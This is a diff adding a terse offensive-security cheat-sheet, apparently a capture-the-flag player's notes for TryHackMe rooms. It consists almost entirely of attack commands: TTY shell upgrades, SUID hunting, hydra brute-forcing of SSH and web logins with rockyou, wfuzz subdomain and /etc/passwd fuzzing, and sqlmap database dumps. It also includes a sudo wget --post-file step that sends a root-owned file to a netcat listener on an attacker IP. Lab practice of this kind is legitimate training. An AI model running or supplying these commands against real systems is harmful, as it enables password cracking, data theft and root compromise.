@@ -1,0 +1,73 @@
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
+
+CTRL-z
+stty raw -echo;fg
+
+####################
+find / -type f -name root.txt 2>/dev/null
+find / -user root -perm -4000 -executable -type f 2>/dev/null
+
+find / -user root -perm -u=s 2>/dev/null
+##############################################
+hydra -l william -P ../wordlist/rockyou.txt ssh://10.10.154.55
+hydra -l joker -P ../wordlist/rockyou.txt -s 8080 10.10.136.132 http-get
+
+hydra -l admin -P ../wordlist/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:login_failed"
+
+hydra -L usernames.txt -P spellnames.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^:Incorrect Username or Password"
+
+#######################
+SUID:wfuzz -c -w ../wordlist/subdomains.txt -u "http://undiscovered.thm" -H "Host: FUZZ.undiscovered.thm" --hw 290
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
+find / -user root -perm -4000 -print 2>/dev/null
+
+
+###############################
+
+prvesc with (root) NOPASSWD: /usr/bin/wget:{
+nc -nlvp 1234
+jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.9.**.**:1234
+}
+
+###################################
+#vuln_search:nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
+
+
+########################################
+Privilege Escalation[
+
+I started by getting a stable bash shell.
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
+CTRL-z
+stty raw -echo;fg
+]
+
+##################################################
+
+steghide extract -sf Alice-White-Rabbit.jpg 
+#####################################
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
+#######################
+sql injection:
+sqlmap -u "http://revenge.thm/products/1" --batch --dbs
+sqlmap -u "http://revenge.thm/products/1" --batch -D duckyinc --tables
+sqlmap -u "http://revenge.thm/products/1" --batch -D duckyinc -T user --dump
+#####################
+subdomain enm:
+wfuzz -c -f undiscovered.txt -w /home/zerosec/Desktop/tryhackme/wordlist/subdomains.txt -u “http://undiscovered.thm/” -H “Host:FUZZ.undiscovered.thm” — hw 290 — hc 404,302
+
+wfuzz -c -w /home/zerosec/Desktop/tryhackme/wordlist/subdomains.txt -H "Host: FUZZ.undiscovered.thm" --hc 302 --hw 356 -t 100 10.10.114.71
+
+wfuzz -w /home/zerosec/Desktop/tryhackme/wordlist/common.txt --hc=404 "http://10.10.129.102:5000/api/v1/resources/books?FUZZ=/etc/passwd"
+
+##################
+
+
+
+
+
+
